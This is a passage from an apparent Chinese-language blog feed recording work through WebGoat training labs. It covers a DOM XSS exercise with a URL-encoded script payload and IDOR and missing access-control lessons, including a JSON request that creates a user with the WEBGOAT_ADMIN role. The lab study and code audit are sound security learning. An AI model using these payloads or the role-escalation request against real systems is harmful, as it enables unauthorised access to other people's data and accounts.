是哈希部分，可能是传递给控制器或路由的参数。</li></ul><p>通常情况下，URL中的哈希部分（#classic&#x2F;CrosSiteScripting.lesson&#x2F;9）通常用于前端路由，这意味着这个URL可能由前端 JavaScript 根据路由规则进行处理。</p><p>在常见的前端框架中，哈希部分被用于单页应用程序（SPA）中的路由处理。它允许前端应用程序根据哈希部分来确定显示的内容，而不会重新加载整个页面。在这种情况下，路由可能被设置为解析哈希部分并根据不同的路由规则显示不同的内容或触发不同的操作。</p><p>在你提供的URL中，可能存在一个名为<code>start.mvc</code>的控制器或路由，它根据哈希部分（<code>#classic/CrosSiteScripting.lesson/9</code>）来确定要显示或执行的内容。具体的路由处理方式和逻辑取决于应用程序的实现和使用的前端框架。</p></blockquote><p>也就是说前端js也对url 进行了路由解析和处理，这可能也是为什么我们前端访问的结构和源码审计里面的结构有所差异了，那这里的测试路由应该就是start.mvc#test了。</p><p>我们访问一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411134.png" alt="image-20231124153354605"></p><p>页面似乎没有发生变化，但是我们应该可以传入参数了：</p><h2 id="（坑）"><a href="#（坑）" class="headerlink" title="（坑）"></a>（坑）</h2><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>&#x3D;&gt;</p><pre><code>%3Cscript%3Ealert(1)%3C/script%3E</code></pre><p>但是这里访问之后并没有反应，</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411135.png" alt="image-20231124154953590"></p><p>看起来我们的分析应该是没有问题的</p><p>后端也没什么好看，主要是这里好像和后端也没啥关系：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411136.png" alt="image-20231124155056841"></p><p>突然发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411137.png" alt="image-20231124155626026"></p><p>如果正常情况下：<img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411138.png" alt="image-20231124155731764"></p><p>看起来我们输入标签之后，它并没有进入危险函数，最后看了后面一题的源码后：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411139.png" alt="image-20231124162920056"></p><p>原来时cyberchef在url加密的时候没有编码 <code>/</code>导致的不成功，要把<img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411140.png" alt="image-20231124163059886"></p><p>编码所有特殊字符勾选上</p><h1 id="xss-11"><a href="#xss-11" class="headerlink" title="xss-11"></a>xss-11</h1><p>这里让我们触发webgoat.customjs.phoneHome（），然后在控制台拿到相应的代码并提交，上一题都做出来了这里也就随便搞了：</p><p>但是这里挺有意思的，发现<code>&lt;script&gt;</code>标签可以不用闭合</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411141.png" alt="image-20231124163249722"></p><p>挺奇怪的，找了半天没有找到依据。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-7&quot;&gt;&lt;a href=&quot;#xss-7&quot; class=&quot;headerlink&quot; title=&quot;xss-7&quot;&gt;&lt;/a&gt;xss-7&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Taninluv/PICLI</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="XSS" scheme="https://taninluv.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-Broken Access Control</title>
    <link href="https://taninluv.github.io/2023/11/23/Broken-Access-Control/"/>
    <id>https://taninluv.github.io/2023/11/23/Broken-Access-Control/</id>
    <published>2023-11-23T07:33:49.000Z</published>
    <updated>2023-11-26T03:26:39.097Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDOR-2"><a href="#IDOR-2" class="headerlink" title="IDOR-2"></a>IDOR-2</h1><blockquote><p>许多访问控制问题容易受到经过身份验证但未经授权的用户的攻击。因此，让我们从合法身份验证开始。然后，我们将寻找绕过或滥用授权的方法。</p></blockquote><p>这里只是输入tom或者cat进行登录，进入下一题进行IDOR审查</p><h1 id="IDOR-3"><a href="#IDOR-3" class="headerlink" title="IDOR-3"></a>IDOR-3</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126523.png" alt="image-20231123154028096"></p><p>抓包看一看没有显示的属性</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126525.png" alt="image-20231123154145613"></p><p>看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126526.png" alt="image-20231123155050326"></p><p>我们发现他把不相关的信息一并返回了，实际 用的信息只有其中三个，而关于判定答案部分：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126527.png" alt="image-20231123155217458"></p><p>以<code>，</code>为分隔，检测答案是否为userid和role</p><h1 id="IDOR-4"><a href="#IDOR-4" class="headerlink" title="IDOR-4"></a>IDOR-4</h1><p>在另一个接口查看自己的profile</p><p>根据描述：</p><blockquote><p>就概要文件而言，我们正在使用的应用程序似乎遵循RESTful模式。许多应用程序都具有提升用户可以访问另一用户内容的角色。在这种情况下，just&#x2F;profile将不起作用，因为自己用户的会话&#x2F;身份验证数据不会告诉我们他们想要查看谁的配置文件。那么，您认为使用直接对象引用显式查看您自己的配置文件的可能模式是什么？</p></blockquote><p>这样的话想起之前我们得到了自己的userid，这里应该是通过userid确定我们需要查看的概要文件，这样的模式在实际情况中也很常见</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126528.png" alt="image-20231123160321880"></p><p>看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126529.png" alt="image-20231123160435656"></p><p>他这里对userid其实没有添加更多的验证和防护，很大程度上我们可以通过爆破或者猜测或者其他方法得到别人的userid就可以得到别人的profile信息</p><h1 id="IDOR-5"><a href="#IDOR-5" class="headerlink" title="IDOR-5"></a>IDOR-5</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126530.png" alt="image-20231123163038524"></p><p>这里访问别人的profile，爆破一下，跟之前说的一样，这里主要做代码审计，就不爆破了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126531.png" alt="image-20231123163321558"></p><p>这个板块的源码给我的感觉有一点刻意了，这里第二个if就该截断才对，可能是单纯为了让我们感受一下吧…</p><h1 id="Missing-Function-Level-Access-Control"><a href="#Missing-Function-Level-Access-Control" class="headerlink" title="Missing Function Level Access Control"></a>Missing Function Level Access Control</h1><p>缺少功能级别访问控制</p><blockquote><p>事实上，许多人（包括本课的作者）会将功能级别的访问控制和IDOR归入“访问控制”。为了OWASP，前10名和这些教训，我们将进行区分。大多数人的区别在于，IDOR更多的是一个“水平”或“横向”访问控制问题，而缺少功能级别的访问控制“暴露了功能”。尽管这里的IDOR课程演示了功能是如何公开的（至少对同一角色的另一个用户），但我们将研究功能公开的其他方式。</p></blockquote><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126532.png" alt="image-20231123163858625"></p><p>在这里找到两个隐藏的表单</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126534.png" alt="image-20231123165225364"></p><p>个人感觉不是很好找这种表单，尤其是在页面元素很多的时候，这道题大概猜测在Accout板块或者Messages板块。其实也看得眼花。。</p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>根据题目，我们可以利用上提找到的信息，也就是两个接口，访问一下&#x2F;users：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126535.png" alt="image-20231123172002806"></p><p>返回500，有点夸张，看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126536.png" alt="image-20231123173705160"></p><p>看来要设置Content-Type,这里的GET请求方法的视图函数返回了所有user</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126537.png" alt="image-20231123172546905"></p><p>挺离谱的，好像意料之外又情理之中</p><p>看一下hint里的复杂思路：</p><p>If the request to view users, were a ‘service’ or ‘RESTful’ endpoint, what would be different about it?</p><p>You will want to add WEBGOAT_ADMIN for the user’s role. Yes, you’d have to guess&#x2F;fuzz this in a real-world setting.</p><p>OK, here it is. First, create an admin user … Change the method to POST, change the content-type to “application&#x2F;json”. And your payload should look something like: {“username”:”newUser2”,”password”:”newUser12”,”matchingPassword”:”newUser12”,”role”:”WEBGOAT_ADMIN”}</p><p>也就是用post新创建一个admin用户，但是需要post的数据又是需要猜测一下的，按照hint就是需要猜测或者fuzz一下。看看源码怎么回事：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126538.png" alt="image-20231123174112906"></p><ul><li><code>consumes = &quot;application/json&quot;</code>：表示这个方法处理的请求内容类型是JSON格式。</li><li><code>produces = &quot;application/json&quot;</code>：表示这个方法返回的响应内容类型是JSON格式。</li></ul><p>这里看起来user类把RequestBody数据进行了一个类型转换然后保存新生成的user，那么只要知道user类有哪些属性就可以新建一个user对象，而user的属性按照我们之前的到的信息似乎只能创建一个普通用户：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126539.png" alt="image-20231123175903217"></p><p>但是到了这里，是不是发现了另一个IDOR？也就是这个role：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126540.png" alt="image-20231123180034526"></p><p>这就很nice了，终于把这条思路走通了</p><p>这里还要再深挖一下为什么是这样？</p><p>通过关键字role全局搜索一下，然后找到了这个</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126541.png" alt="image-20231123181632640"></p><p>可以看到，它并不是lesson中的javabean</p><p>我们回想一下，我们访问的是根目录下的user页面而不是子目录的某个lesson的页面，因此这里的user可能不是这个org.owasp.webgoat.lessons.missingac.User.java</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126542.png" alt="image-20231123181421895"></p><p>此时我们再看</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126543.png" alt="image-20231123182427749"></p><p>这个userrepo：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126544.png" alt="image-20231123182712982"></p><p>继续跟进去</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126545.png" alt="image-20231123182854157"></p><p>发现它是从数据库动态查询用户数据</p><p>但是这个数据库是这个题目的独立数据库还是整个项目用来储存实际用户比如我（water3666）？继续跟进发现有点过于复杂了，但是这里已经说明了数据是来自哪里了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126546.png" alt="image-20231123183252707"></p><p>当时没反应过来，如果是题目的数据库，应该是tom或者jerry，或者根本没有独立的数据库，至于如何封装到题目的user的，就先不挖了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDOR-2&quot;&gt;&lt;a href=&quot;#IDOR-2&quot; class=&quot;headerlink&quot; title=&quot;IDOR-2&quot;&gt;&lt;/a&gt;IDOR-2&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;许多访问控制问题容易受到经过身份验证但未经授权的用户的攻击。因此，让我们从合法身份</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="IDOR" scheme="https://taninluv.github.io/tags/IDOR/"/>
    
  </entry>
  
</feed>
